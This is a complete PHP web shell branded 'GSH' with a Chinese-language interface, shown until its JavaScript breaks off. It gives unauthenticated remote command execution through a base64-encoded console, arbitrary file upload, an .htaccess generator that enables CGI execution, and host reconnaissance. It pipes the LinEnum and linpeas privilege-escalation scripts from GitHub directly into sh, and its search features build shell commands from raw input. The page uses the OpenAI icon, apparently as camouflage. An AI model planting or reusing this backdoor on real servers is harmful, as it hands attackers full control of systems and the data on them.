<?php
    function unhex($y)
    {
        // $n = '';
        // for ($i = 0; $i < strlen($y) - 1; $i += 2) {
        //     $n .= chr(hexdec($y[$i] . $y[$i + 1]));
        // }
        // return $n;
        return $y;
    }
    function hex($n)
    {
        // $y = '';
        // for ($i = 0; $i < strlen($n); $i++) {
        //     $y .= dechex(ord($n[$i]));
        // }
        return $n;
    }

    function writable($dir, $permit) {
        if(!is_writable($dir)) {
            return "<rd>".$permit."</rd>";
        } else {
            return "<gr>".$permit."</gr>";
        }
    }

    function get_permit($file){
        $p = fileperms($file);
        if (($p & 0xC000) == 0xC000) {
            $i = 's';
        } elseif (($p & 0xA000) == 0xA000) {
            $i = 'l';
        } elseif (($p & 0x8000) == 0x8000) {
            $i = '-';
        } elseif (($p & 0x6000) == 0x6000) {
            $i = 'b';
        } elseif (($p & 0x4000) == 0x4000) {
            $i = 'd';
        } elseif (($p & 0x2000) == 0x2000) {
            $i = 'c';
        } elseif (($p & 0x1000) == 0x1000) {
            $i = 'p';
        } else {
            $i = 'u';
        }
        $i .= (($p & 0x0100) ? 'r' : '-');
        $i .= (($p & 0x0080) ? 'w' : '-');
        $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
        
        $i .= (($p & 0x0020) ? 'r' : '-');
        $i .= (($p & 0x0010) ? 'w' : '-');
        $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));

        $i .= (($p & 0x0004) ? 'r' : '-');
        $i .= (($p & 0x0002) ? 'w' : '-');
        $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
        return $i;
    }

    function ON_and_OFF($bool){
        return $bool ? "<gr>ON</gr>" : "<rd>OFF</rd>";
    }

    function exe($cmd) {
        if (function_exists('system')) {
            @ob_start();
            @system($cmd);
            $buff = @ob_get_contents();
            @ob_end_clean();
            return $buff;
        } elseif (function_exists('exec')) {
            @exec($cmd, $results);
            $buff = "";
            foreach ($results as $result) {
                $buff .= $result;
            }
            return $buff;
        } elseif (function_exists('passthru')) {
            @ob_start();
            @passthru($cmd);
            $buff = @ob_get_contents();
            @ob_end_clean();
            return $buff;
        } elseif (function_exists('proc_open')) {
            $pipes = array();
            $process = @proc_open($cmd . ' 2>&1', array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null);
            $buff = @stream_get_contents($pipes[1]);
            @proc_close($process);
            return $buff;
        } elseif (function_exists('shell_exec')) {
            $buff = @shell_exec($cmd);
            return $buff;
        }
    }

    function msgbox(){
        echo '<style>table{display:none;}</style><div class="table-responsive"><hr></div>';
    }
    function ok_banner(){
        echo '<div class="alert alert-success alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
    }
    function error_banner(){
        echo '<div class="alert alert-danger alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
    }

    function listFilesInDirectory($dir)
    {
        if (is_dir($dir)) {
            if ($dh = opendir($dir)) {
                echo "<table class='table mt-3' style='border-collapse: collapse;'>";
                echo "<thead><tr>
                    <th class='text-center'>Filename</th>
                    <th class='text-center'>Type</th>
                    <th class='text-center'>Last Modified</th>
                    <th class='text-center'>Size</th>
                    <th class='text-center'>Owner/Group</th>
                    <th class='text-center'>Permission</th>
                    <th class='text-center'>Action</th>
                </tr></thead><tbody>";
                echo "<tr>
                    <td class='text-center'><a href='?path=" . getcwd() . "/..'>..</a></td>
                    <td class='text-center'>-</td>
                    <td class='text-center'>-</td>
                    <td class='text-center'>-</td>
                    <td class='text-center'>-</td>
                    <td class='text-center'>-</td>
                    <td class='text-center'>
                        <button class='btn btn-sm btn-outline-primary'><i class='bi bi-file-earmark-plus-fill'></i></button>
                        <button class='btn btn-sm btn-outline-primary'><i class='bi bi-folder-plus'></i></button>
                    </td>
                </tr>";
                while (($file = readdir($dh)) !== false) {
                    if ($file != '.' && $file != '..') {
                        $filepath = $dir . '/' . $file;
                        $filetype = filetype($filepath);
                        $lastEdit = date("Y-m-d H:i:s", filemtime($filepath));
                        $size = filesize($filepath);
                        $owner = posix_getpwuid(fileowner($filepath))['name'];
                        $group = posix_getgrgid(filegroup($filepath))['name'];
                        $permissions = writable($filepath, get_permit($filepath));
                        echo "<tr>
                            <td class='text-center'>{$file}</td>
                            <td class='text-center'>{$filetype}</td>
                            <td class='text-center'>{$lastEdit}</td>
                            <td class='text-center'>{$size}</td>
                            <td class='text-center'>{$owner}/{$group}</td>
                            <td class='text-center'>{$permissions}</td>
                            <td class='text-center'>";
                        if ($filetype == 'dir') {
                            echo "<button class='btn btn-sm btn-outline-secondary'><i class='bi bi-pencil-fill'></i></button> ";
                            echo "<button class='btn btn-sm btn-outline-secondary'><i class='bi bi-file-zip-fill'></i></button> ";
                            echo "<button class='btn btn-sm btn-outline-secondary'><i class='bi bi-download'></i></button> ";
                            echo "<button class='btn btn-sm btn-outline-danger'><i class='bi bi-trash-fill'></i></button>";
                        } else {
                            echo "<button class='btn btn-sm btn-outline-secondary'><i class='bi bi-eye-fill'></i></button> ";
                            echo "<button class='btn btn-sm btn-outline-secondary'><i class='bi bi-pencil-square'></i></button> ";
                            echo "<button class='btn btn-sm btn-outline-secondary'><i class='bi bi-pencil-fill'></i></button> ";
                            echo "<button class='btn btn-sm btn-outline-secondary'><i class='bi bi-file-zip-fill'></i></button> ";
                            echo "<button class='btn btn-sm btn-outline-secondary'><i class='bi bi-download'></i></button> ";
                            echo "<button class='btn btn-sm btn-outline-danger'><i class='bi bi-trash-fill'></i></button>";
                        }
                        echo "</td></tr>";
                    }
                }
                echo "</tbody></table>";
                closedir($dh);
            }
        } else {
            echo "<p>Invalid directory: {$dir}</p>";
        }
    }

    function showUploadInterface($content=null) {
        echo "
        <div id='upload-container' class='upload-box' style='display: none;'>
            <div class='upload-content'>";
        if($content === null){
            echo "<form action='?' method='post' enctype='multipart/form-data'>
                    <h3>上傳文件</h3>
                    <input type='file' name='fileToUpload' id='fileToUpload'>
                    <br><br>
                    <input type='submit' value='上傳文件' name='submit' class='btn btn-primary'>
                    <button type='button' class='btn btn-secondary' onclick='hideUploadInterface();'>取消</button>
                </form>";
        }
        echo"
            </div>
        </div>
        ";
    }

    function handleConsole() {
        if(isset($_POST['cmd'])) {
            $encodedCmd = $_POST['cmd'];
            $cmd = base64_decode($encodedCmd);
            $output = exe($cmd);
            echo json_encode(['output' => $output]);
        } else {
            echo '
            <div id="consoleContainer" class="dialog-container bg-dark text-light p-3 rounded">
                <div id="consoleOutput" class="mb-3" style="height: 300px; overflow-y: auto; border: 1px solid #444; padding: 10px;"></div>
                <div id="consoleForm">
                    <div class="d-flex">
                        <input type="text" class="form-control bg-secondary text-light me-2" id="cmdInput" placeholder="輸入命令">
                        <button class="btn btn-outline-light" type="button" onclick="executeCommand()">執行</button>
                    </div>
                </div>
            </div>
            ';
        }
    }

    function handleNetworkScan() {
        if(isset($_POST['execute'])) {
            // 檢查 netstat 是否存在
            $netstat_exists = exe('which netstat');
            if (empty($netstat_exists)) {
                echo json_encode(['output' => "netstat doesn't exist"]);
                return;
            }
            $command = "netstat -lp";
            $output = exe($command);
            echo json_encode(['output' => $output]);
        } else {
            echo '
            <div id="networkScanContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
                <div id="networkScanOutput" class="mb-3" style="height: 300px; overflow-y: auto; border: 1px solid #444; padding: 10px;"></div>
                <div class="d-flex">
                    <button class="btn btn-outline-light" style="width: 100%;" type="button" onclick="executeNetworkScan()">執行 Network Scan</button>
                </div>
            </div>
            ';
        }
    }

    function handleLinEnum() {
        if(isset($_POST['execute'])) {
            // 檢查 curl 是否存在
            $curl_exists = exe('which curl');
            if (empty($curl_exists)) {
                echo json_encode(['output' => "curl doesn't exist"]);
                return;
            }

            // 如果 curl 存在,執行 LinEnum
            $command = "curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/refs/heads/master/LinEnum.sh | sh";
            $output = exe($command);
            echo json_encode(['output' => $output]);
        } else {
            echo '
            <div id="linEnumContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
                <div id="linEnumOutput" class="mb-3" style="height: 300px; overflow-y: auto; border: 1px solid #444; padding: 10px;"></div>
                <div class="d-flex">
                    <button class="btn btn-outline-light" style="width: 100%;" type="button" onclick="executeLinEnum()">執行 LinEnum</button>
                </div>
            </div>
            ';
        }
    }

    function handleLinpeas() {
        if(isset($_POST['execute'])) {
            // 檢查 curl 是否存在
            $curl_exists = exe('which curl');
            if (empty($curl_exists)) {
                echo json_encode(['output' => "curl doesn't exist"]);
                return;
            }

            // 如果 curl 存在,執行 Linpeas
            $command = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh";
            $output = exe($command);
            echo json_encode(['output' => $output]);
        } else {
            echo '
            <div id="linpeasContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
                <div id="linpeasOutput" class="mb-3" style="height: 300px; overflow-y: auto; border: 1px solid #444; padding: 10px;"></div>
                <div class="d-flex">
                    <button class="btn btn-outline-light" style="width: 100%;" type="button" onclick="executeLinpeas()">執行 Linpeas</button>
                </div>
            </div>
            ';
        }
    }

    function handleSearchFile() {
        if(isset($_POST['filename'])) {
            $filename = $_POST['filename'];
            $path = isset($_POST['path']) ? unhex($_POST['path']) : '.';
            $command = "find '$path' -name '*$filename*'";
            $output = exe($command);
            echo json_encode(['output' => htmlspecialchars($output, ENT_QUOTES, 'UTF-8')]);
        } else {
            echo '
            <div id="searchFileContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
                <div id="searchFileOutput" class="mb-3" style="height: 300px; overflow-y: auto; border: 1px solid #444; padding: 10px;"></div>
                <div id="searchFileForm">
                    <div class="d-flex">
                        <input type="text" class="form-control bg-secondary text-light me-2" id="filenameInput" placeholder="輸入文件名" style="width: calc(100% - 100px);">
                        <button class="btn btn-outline-light" style="width: 90px;" type="button" onclick="searchFile()">搜索</button>
                    </div>
                </div>
            </div>
            ';
        }
    }

    function handleSearchContent() {
        if(isset($_POST['content'])) {
            $content = $_POST['content'];
            $path = isset($_POST['path']) ? unhex($_POST['path']) : '.';
            $command = "grep -r '$content' '$path'";
            $output = exe($command);
            echo json_encode(['output' => htmlspecialchars($output, ENT_QUOTES, 'UTF-8')]);
        } else {
            echo '
            <div id="searchContentContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
                <div id="searchContentOutput" class="mb-3" style="height: 300px; overflow-y: auto; border: 1px solid #444; padding: 10px;"></div>
                <div id="searchContentForm">
                    <div class="d-flex">
                        <input type="text" class="form-control bg-secondary text-light me-2" id="contentInput" placeholder="輸入搜索內容" style="width: calc(100% - 100px);">
                        <button class="btn btn-outline-light" style="width: 90px;" type="button" onclick="searchContent()">搜索</button>
                    </div>
                </div>
            </div>
            ';
        }
    }

    function handleHtaccess() {
        $path = isset($_POST['path']) ? unhex($_POST['path']) : getcwd();
        
        if(isset($_POST['content'])) {
            $content = $_POST['content'];
            $htaccessPath = $path . '/.htaccess';
            
            if (file_put_contents($htaccessPath, $content) !== false) {
                echo json_encode(['success' => true]);
            } else {
                echo json_encode(['success' => false, 'error' => '無法創建.htaccess文件']);
            }
        } else {
            // 預設的.htaccess範本
            $defaultContent = "Options +ExecCGI +Includes +FollowSymLinks\n";
            $defaultContent .= "AddType application/x-httpd-cgi .cgi\n";
            $defaultContent .= "AddHandler cgi-script .cgi\n\n";
            $defaultContent .= "<FilesMatch \".+\.ph(p[3457]?|t|tml)$\">\n";
            $defaultContent .= "    Order Allow,Deny\n";
            $defaultContent .= "    Allow from all\n";
            $defaultContent .= "</FilesMatch>\n\n";
            $defaultContent .= "<IfModule mod_rewrite.c>\n";
            $defaultContent .= "    RewriteEngine On\n";
            $defaultContent .= "    RewriteCond %{REQUEST_FILENAME} !-f\n";
            $defaultContent .= "    RewriteCond %{REQUEST_FILENAME} !-d\n";
            $defaultContent .= "    RewriteRule ^(.*)$ index.php/$1 [L]\n";
            $defaultContent .= "</IfModule>";
            
            echo '
            <div id="htaccessContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
                <div class="mb-3">
                    <textarea id="htaccessContent" class="form-control bg-secondary text-light" 
                        style="height: 300px; resize: none;" 
                        placeholder="輸入.htaccess內容...">' . htmlspecialchars($defaultContent) . '</textarea>
                </div>
                <div class="d-flex justify-content-center">
                    <button class="btn btn-outline-light" 
                        style="min-width: 120px; padding: 8px 20px;" 
                        type="button" 
                        onclick="generateHtaccess()">Generate</button>
                </div>
            </div>
            ';
        }
    }

    // 新增 API 路由處理
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $op = $_POST['op'] ?? '';
        
        switch ($op) {
            case 'upload':
                handleFileUpload();
                break;
            case 'console':
                handleConsole();
                break;
            case 'netscan':
                handleNetworkScan();
                break;
            case 'linenum':
                handleLinEnum();
                break;
            case 'linpeas':
                handleLinpeas();
                break;
            case 'searchfile':
                handleSearchFile();
                break;
            case 'searchcontent':
                handleSearchContent();
                break;
            case 'htaccess':
                handleHtaccess();
                break;
            // 可以在此添加其他 API 操作
            default:
                http_response_code(400);
                echo json_encode(['error' => '無效的操作']);
                break;
        }
        exit;
    }

    // 修改 handleFileUpload 函數
    function handleFileUpload() {
        if (isset($_POST['data']) && isset($_POST['filename'])) {
            $data = $_POST['data'];
            $filename = $_POST['filename'];

            $decodedData = base64_decode($data);
            if ($decodedData === false) {
                http_response_code(400);
                echo json_encode(['error' => '無法解碼文件數據']);
                return;
            }

            if (file_put_contents($filename, $decodedData) !== false) {
                echo json_encode(['success' => '文件上傳成功']);
            } else {
                http_response_code(500);
                echo json_encode(['error' => '保存文件失敗']);
            }
        } else {
            http_response_code(400);
            echo json_encode(['error' => '未收到數據']);
        }
    }

    $_data = array_merge($_POST, $_GET);
    
?>

<?php 
    $sql = ON_and_OFF(function_exists('mysqli_connect'));
    $curl = ON_and_OFF(function_exists('curl_init'));
    $wget = ON_and_OFF(exe('wget --help'));
    $pl = ON_and_OFF(exe('perl --help'));
    $py = ON_and_OFF(exe('python --help'));
    $gcc = ON_and_OFF(exe('gcc --version'));
    $disfunc = @ini_get("disable_functions");
    $kernel = php_uname();
    $phpver = PHP_VERSION;
    $phpos = PHP_OS;
    $SNAME = $_SERVER["SERVER_NAME"];
    $SSOFT = $_SERVER["SERVER_SOFTWARE"];
    $HOST = gethostbyname($_SERVER['HTTP_HOST']);
    $CLIENT = $_SERVER['REMOTE_ADDR'];
    $disfunc = empty($disfunc) ? "<gr>NONE</gr>" : "<rd>$disfunc</rd>";

    if(!function_exists('posix_getegid')) {
        $user = @get_current_userror_banner();
        $uid = @getmyuid();
        $gid = @getmygid();
        $group = "?";
    } else {
        $uid = @posix_getpwuid(posix_geteuid());
        $gid = @posix_getgrgid(posix_getegid());
        $user = $uid['name'];
        $uid = $uid['uid'];
        $group = $gid['name'];
        $gid = $gid['gid'];
    }
    $SAFE_MODE = ON_and_OFF(@ini_get(strtolower("safe_mode")) == 'on');
?>

<!DOCTYPE html>
<html>
<head>
    <meta http-equiv='content-type' content='text/html; charset=UTF-8'>
    <title>Shell GSH</title>
    <meta charset='UTF-8'>
    <meta name='author' content='GSH'>
    <meta name='viewport' content='width=device-width, initial-scale=0.70'>
    <link rel='icon' href='https://chat.openai.com/apple-touch-icon.png'>
    <link rel='stylesheet' href='https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css'>
    <link rel='stylesheet' href='https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css'>
    <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css'>
    <script src='https://cdnjs.cloudflare.com/ajax/libs/prism/1.6.0/prism.js'></script>
    <script src='https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js'></script>
    <script src='https://code.jquery.com/jquery-3.3.1.slim.min.js'></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;300;400;500;600;700;800;900&display=swap');
        *{
            font-family: 'Poppins', sans-serif;
            font-weight: 400;
        }
        gr {
            color: green;
        }
        rd {
            color: red;
        }
        corner {
            position: relative;
        }
        
        .upload-box {
            width: 75%;
            margin: 0 auto;
            position: relative;
            top: 50px;
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
        }

        .upload-content {
            text-align: center;
        }

        .upload-text {
            color: #000;
            margin-bottom: 15px;
            font-weight: bold;
        }
        
        .drop-zone {
            border: 2px dashed #ccc;
            padding: 40px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .drop-zone.dragover {
            background-color: #e8e8e8;
        }

        .btn {
            margin-top: 10px;
        }

        /* 修改這個樣式 */
        .dialog-container {
            width: 85%;
            margin: 0 auto;
            background: transparent;
            padding: 20px;
            border-radius: 10px;
            box-shadow: none;
        }

        /* 調整輸入框和按鈕的樣式 */
        .dialog-container input[type="text"] {
            width: calc(100% - 100px);
            margin-right: 10px;
        }

        .dialog-container button {
            width: 90px;
        }

        #uploadInterface .btn-outline-light:hover {
            background-color: rgba(255, 255, 255, 0.1);
        }

        #uploadInterface .btn-outline-light {
            padding: 20px;
        }

        /* 確保 dialog-container 在這個情況下不會有固定的寬度 */
        #uploadInterface .dialog-container {
            width: auto;
            max-width: none;
        }

        #uploadConfirmationStep {
            width: 100%;
        }
    </style>
</head>
<body class='bg-secondary text-light'>
    <div class='container-fluid'>
        <div class='py-3' id='main'>
            <div class='box shadow bg-dark p-4 rounded-3'>
                <a class='text-decoration-none text-light anu d-inline-block' href='<?php echo $_SERVER['PHP_SELF'];?>' style='width: fit-content;'>
                    <h4 class='m-0'>GSH</h4>
                </a>
                <br>
                <a class='text-decoration-none' href='?path=/'><i class='bi bi-pc-display'></i></a>:
                /<?php
                if(isset($_GET['path'])){
                    $cpath = unhex($_GET['path']);
                    chdir($cpath);
                }else{
                    $cpath = getcwd();
                }
                $cpath = str_replace('\\','/',$cpath);
                $pathds = explode('/',$cpath);
                $temp = "/";
                foreach($pathds as $pdir){
                    if($pdir == '') continue;
                    $temp = $temp . $pdir . '/';
                    echo "<a class='text-decoration-none' href='?path=" . hex($temp) ."'>$pdir</a>/";
                }
                echo "[".writable($cpath, get_permit($cpath))."]";
                ?>
            </div>
        <div class='container-fluid'>
            <div class='collapse text-dark mb-3' id='collapseExample'>
                <div class='box shadow bg-light p-3 rounded-3'>
                    <?php
                    echo"
                    <table>
                        <tr>
                            <th>System</th> <td><gr>$kernel</gr><br></td>
                        </tr>
                        <tr>
                            <th>User</th> <td><gr>$user</gr> ($uid) | Group: <gr>$group</gr> ($gid)</td>
                        </tr>
                        <tr>
                            <th>PHP Version</th> <td><gr>$phpver</gr></td>
                        </tr>
                        <tr>
                            <th>PHP OS</th> <td><gr>$phpos</gr></td>
                        </tr>
                        <tr>
                            <th>Software</th> <td><gr>$SSOFT</gr></td>
                        </tr>
                        <tr>
                            <th>Domain</th> <td><gr>$SNAME</gr></td>
                        </tr>
                        <tr>
                            <th>Server IP</th> <td><gr>$HOST</gr></td>
                        </tr>
                        <tr>
                            <th>Client IP</th> <td><gr>$CLIENT</gr></td>
                        </tr>
                        <tr>
                            <th>Safe Mode</th> <td>$SAFE_MODE</td>
                        </tr>
                        <tr>
                            <th>Disable Function</th> <td>$disfunc</td>
                        </tr>
                    </table>
                    MySQL: $sql | Perl: $pl | WGET: $wget | CURL: $curl | Python: $py | GCC: $gcc<br>";
                    ?>
                </div>
            </div>
        </div>
        <div class='container-fluid mt-4'>
            <div class='d-flex justify-content-center'>
                <div class='btn-group flex-wrap'>
                    <button class='btn btn-outline-light flex-fill text-center' data-bs-toggle='collapse' data-bs-target='#collapseExample' aria-expanded='false' aria-controls='collapseExample'>
                        <i class='bi bi-info-circle'></i> Info
                    </button>
                    <a class='btn btn-outline-light flex-fill text-center' onclick="showUploadInterface()">Upload</a>
                    <a href='javascript:void(0);' onclick="showConsole()" class='btn btn-outline-light flex-fill text-center'>Console</a>
                    <a href='javascript:void(0);' onclick="showNetworkScan()" class='btn btn-outline-light flex-fill text-center'>Network Scan</a>
                    <a href='javascript:void(0);' onclick="showLinEnum()" class='btn btn-outline-light flex-fill text-center'>LinEnum Scan</a>
                    <a href='javascript:void(0);' onclick="showLinpeas()" class='btn btn-outline-light flex-fill text-center'>Linpeas Scan</a>
                    <a href='javascript:void(0);' onclick="showHtaccess()" class='btn btn-outline-light flex-fill text-center'>Create Htaccess</a>
                    <a href='javascript:void(0);' onclick="showSearchFile()" class='btn btn-outline-light flex-fill text-center'>Search Filename</a>
                    <a href='javascript:void(0);' onclick="showSearchContent()" class='btn btn-outline-light flex-fill text-center'>Search Content</a>
                    <a href='?op=logout' class='btn btn-outline-light flex-fill text-center'>Logout</a>
                </div>
            </div>
        </div>
    </div>

    <div id='file-container' class='container-fluid mt-4'>
        <?php listFilesInDirectory(getcwd());?>
    </div>

    <div class="container-fluid mt-4" id="uploadInterface" style="display: none;">
        <div class="dialog-container bg-dark text-light p-3 rounded d-flex justify-content-center align-items-center" style="height: 200px;">
            <div id="fileSelectionStep" class="text-center">
                <input type="file" id="fileInput" style="display: none;">
                <button class="btn btn-outline-light btn-lg" onclick="document.getElementById('fileInput').click()">
                    <i class="bi bi-file-earmark-arrow-up" style="font-size: 3rem;"></i>
                </button>
            </div>
            <div id="uploadConfirmationStep" style="display: none;">
                <div class="text-center">
                    <span id="selectedFileName" class="text-light d-block mb-3"></span>
                    <div class="d-flex justify-content-center">
                        <button class="btn btn-outline-secondary me-2" onclick="cancelUpload()">取消</button>
                        <button class="btn btn-outline-primary" onclick="uploadFile()">確認上傳</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
		const currentScript = "<?= basename(__FILE__) ?>";
        function hideAllInterfaces() {
            document.getElementById('file-container').style.display = 'none';
            document.getElementById('uploadInterface').style.display = 'none';
            let dialogContainers = document.querySelectorAll('.dialog-container');
            dialogContainers.forEach(container => {
                container.style.display = 'none';
            });
        }

        function showUploadInterface() {
            hideAllInterfaces();
            document.getElementById('uploadInterface').style.display = 'block';
            document.getElementById('fileSelectionStep').style.display = 'block';
            document.getElementById('uploadConfirmationStep').style.display = 'none';
        }

        function hideUploadInterface() {
            document.getElementById('uploadInterface').style.display = 'none';
            document.getElementById('file-container').style.display = 'block';
            resetUploadInterface();
        }

        function resetUploadInterface() {
            document.getElementById('fileSelectionStep').style.display = 'block';
            document.getElementById('uploadConfirmationStep').style.display = 'none';
            document.getElementById('selectedFileName').textContent = '';
            document.getElementById('fileInput').value = '';
        }

        document.getElementById('fileInput').addEventListener('change', function() {
            if (this.files.length) {
                document.getElementById('selectedFileName').textContent = this.files[0].name;
                document.getElementById('fileSelectionStep').style.display = 'none';
                document.getElementById('uploadConfirmationStep').style.display = 'block';
            }
        });

        function cancelUpload() {
            resetUploadInterface();
        }

        function uploadFile() {
            const fileInput = document.getElementById('fileInput');
            if (fileInput.files.length === 0) {
                alert('請先選擇一個檔案');
                return;
            }

            const file = fileInput.files[0];
            const reader = new FileReader();

            reader.onload = function(e) {
                const base64Data = e.target.result.split(',')[1];
                sendBase64Data(base64Data, file.name);
            };

            reader.readAsDataURL(file);
        }

        function sendBase64Data(base64Data, fileName) {
            const formData = new URLSearchParams();
            formData.append('data', base64Data);
            formData.append('op', 'upload');
            formData.append('filename', fileName);

            fetch(currentScript, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: formData.toString(),
            })
            .then(response => response.text())
            .then(result => {
                console.log('功：', result);
                alert('上傳成功！');
                location.reload(); // 刷新主頁面
            })
            .catch(error => {
                console.error('錯誤：', error);
                alert('上傳失！');
            });
        }

        function showConsole() {
            hideAllInterfaces();
            fetch(currentScript, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'op=console'
            })
            .then(response => response.text())
            .then(html => {
                let consoleContainer = document.getElementById('consoleContainer');
                if (!consoleContainer) {
                    consoleContainer = document.createElement('div');
                    consoleContainer.id = 'consoleContainer';
                    consoleContainer.className = 'dialog-container';
                    document.body.appendChild(consoleContainer);
                }
                
                consoleContainer.innerHTML = html;
                consoleContainer.style.display = 'block';
                
                // 調整輸入框和按鈕的寬度
                const cmdInput = document.getElementById('cmdInput');
                const executeButton = document.querySelector('#consoleForm button');
                if (cmdInput && executeButton) {
                    cmdInput.style.width = 'calc(100% - 100px)';
                    executeButton.style.width = '90px';
                }
                
                document.getElementById('cmdInput').addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') {
                        executeCommand();
                    }
                });
            });
        }

        function executeCommand() {
            const cmd = document.getElementById('cmdInput').value;
            const encodedCmd = btoa(unescape(encodeURIComponent(cmd)));
            fetch(currentScript, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `op=console&cmd=${encodedCmd}`
            })
            .then(response => response.json())
            .then(data => {
                const outputDiv = document.getElementById('consoleOutput');
                outputDiv.innerHTML = `<div class="mb-2"><strong>$</strong> ${cmd}</div><pre>${data.output}</pre>`;
                outputDiv.scrollTop = outputDiv.scrollHeight;
                document.getElementById('cmdInput').value = '';
            });
        }

        function showNetworkScan() {
            hideAllInterfaces();
            fetch(currentScript, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'op=netscan'
            })
            .then(response => response.text())
            .then(html => {
                let consoleContainer = document.getElementById('consoleContainer');
                if (!consoleContainer) {
                    consoleContainer = document.createElement('div');
                    consoleContainer.id = 'consoleContainer';
                    consoleContainer.className = 'dialog-container';
                    document.body.appendChild(consoleContainer);
                }
                
                consoleContainer.innerHTML = html;
                consoleContainer.style.display = 'block';
            });
        }

        function executeNetworkScan() {
            fetch(currentScript, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'op=netscan&execute=1'
            })
            .then(response => response.json())
            .then(data => {
                document.getElementById('networkScanOutput').innerHTML = `<pre>${data.output}</pre>`;
            });
        }

        function showLinEnum() {
            hideAllInterfaces();
            fetch(currentScript, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'op=linenum'
            })
            .then(response => response.text())
            .then(html => {
                let consoleContainer = document.getElementById('consoleContainer');
                if (!consoleContainer) {
                    consoleContainer = document.createElement('div');
                    consoleContainer.id = 'consoleContainer';
                    consoleContainer.className = 'dialog-container';
                    document.body.appendChild(consoleContainer);
                }
                
                consoleContainer.innerHTML = html;
                consoleContainer.style.display = 'block';
            });
        }

        function executeLinEnum() {
            fetch(currentScript, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'op=linenum&execute=1'
            })
            .then(response => response.json())
            .then(data => {
                document.getElementById('linEnumOutput').innerHTML = `<pre>${data.output}</pre>`;
            });
        }

        function showLinpeas() {
            hideAllInterfaces();
            fetch(currentScript, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'op=linpeas'
            })
            .then(response => response.text())
            .then(html => {
                let consoleContainer = document.getElementById('consoleContainer');
                if (!consoleContainer) {
                    consoleContainer = document.createElement('div');
                    consoleContainer.id = 'consoleContainer';
                    consoleContainer.className = 'dialog-container';
                    document.body.appendChild(consoleContainer);
                }
                
                consoleContainer.innerHTML = html;
                consoleContainer.style.display = 'block';
            });
        }

        function executeLinpeas() {
            fetch(currentScript, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'op=linpeas&execute=1'
            })
            .then(response => response.json())
            .then(data => {
                document.getElementById('linpeasOutput').innerHTML = `<pre>${data.output}</pre>`;
            });
        }

        function showSearchFile() {
            hideAllInterfaces();
            const urlParams = new URLSearchParams(window.location.search);
            const path = urlParams.get('path');

            let body = 'op=searchfile';
            if (path) {
                body += `&path=${encodeURIComponent(path)}`;
            }

            fetch(currentScript, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: body
            })
            .then(response => response.text())
            .then(html => {
                let searchFileContainer = document.getElementById('searchFileContainer');
                if (!searchFileContainer) {
                    searchFileContainer = document.createElement('div');
                    searchFileContainer.id = 'searchFileContainer';
                    searchFileContainer.className = 'dialog-container';
                    document.body.appendChild(searchFileContainer);
                }
                
                searchFileContainer.innerHTML = html;
                searchFileContainer.style.display = 'block';
                
                document.getElementById('filenameInput').addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') {
                        searchFile();
                    }
                });
            });
        }

        function searchFile() {
            const filename = document.getElementById('filenameInput').value;
            const urlParams = new URLSearchParams(window.location.search);
            const path = urlParams.get('path');

            let body = `op=searchfile&filename=${encodeURIComponent(filename)}`;
            if (path) {
                body += `&path=${encodeURIComponent(path)}`;
            }

            fetch(currentScript, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: body
            })
            .then(response => response.json())
            .then(data => {
                const outputDiv = document.getElementById('searchFileOutput');
                outputDiv.innerHTML = `<pre>${data.output}</pre>`;
                outputDiv.scrollTop = outputDiv.scrollHeight;
            });
        }

        function showSearchContent() {
            hideAllInterfaces();
            const urlParams = new URLSearchParams(window.location.search);
            const path = urlParams.get('path');

            let body = 'op=searchcontent';
            if (path) {
                body += `&path=${encodeURIComponent(path)}`;
            }

            fetch(currentScript, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
